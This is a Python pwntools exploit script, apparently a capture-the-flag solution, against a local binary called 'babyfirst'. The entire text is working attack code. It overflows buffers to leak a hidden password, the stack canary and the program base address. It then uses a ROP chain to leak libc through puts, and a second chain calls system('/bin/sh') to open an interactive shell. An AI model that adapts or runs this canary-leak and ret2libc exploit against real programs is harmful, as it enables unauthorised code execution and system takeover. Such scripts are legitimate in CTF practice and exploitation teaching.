from pwn import *
import time

p=process('./babyfirst')
elf=ELF('babyfirst')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
##ROP find
rop = ROP('babyfirst')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

def tag(a,b):
	log.info('Address {}: {}'.format(a,hex(b)))
# pause()
p.sendline('1')
time.sleep(0.5)
payload= 'b'* (0x20-3)+'pas' 
p.send(payload)     #send w0 /n 0x20 to concat password to username
time.sleep(0.5)      
p.sendline('2')
time.sleep(0.5)
p.recvuntil('pas')
pas=p.recv(16)       #recv 16 byte passsword
p.sendline('1')
time.sleep(0.5)
p.sendline('admin\0')  
time.sleep(0.5)
p.sendline(pas)
time.sleep(0.5)
p.sendline('2')
time.sleep(0.5)
p.send('a'*(0x28-3)+'can'+'#')
time.sleep(0.5)
p.recvuntil('can')
canary=p.recv(8)
canary=bytearray(canary)
canary[0]=b'\x00'
canary=u64(canary)
tag('canary',canary)
time.sleep(0.5)



## Leak text_base
pay='b'*(0x30)+'#'*8
p.send(pay)
p.recvuntil('########')
ret=p.recv(8)
ret=bytearray(ret)
ret[-1]='\x00'
ret=ret.ljust(8,'\x00')
ret=u64(ret)

tag('ret',ret)
time.sleep(0.5)
text_base=ret-0xf8d
tag('text_base',text_base)
time.sleep(0.5)

## ROP1 leak libc
rdi=pop_rdi+text_base
puts=text_base+elf.sym['puts']
puts_got=text_base+elf.got['puts']
main = text_base+elf.sym['main']

log.info('ROPPING1...')
sleep(2)
rop1='END'+ cyclic(0x28-3)+p64(canary)+'a'*8+p64(rdi)+p64(puts_got)+p64(puts)+p64(main)
p.sendline(rop1)
p.recvuntil('~~')
leak=p.recv(7)
leak=u64(leak.ljust(8,'\0'))
tag('leak',leak)
libc_base=leak-libc.sym['puts']
tag('libc_base',libc_base)

## ROP2 get shell
p.sendline('2')
time.sleep(0.5)
log.info('ROPPING2...')
sleep(2)
sys=libc_base+libc.sym['system']
bin_sh=libc_base+libc.search('/bin/sh').next()
rop2='END'+ cyclic(0x28-3)+p64(canary)+'a'*8+p64(rdi)+p64(bin_sh)+p64(sys)+p64(main)
p.sendline(rop2)

p.interactive()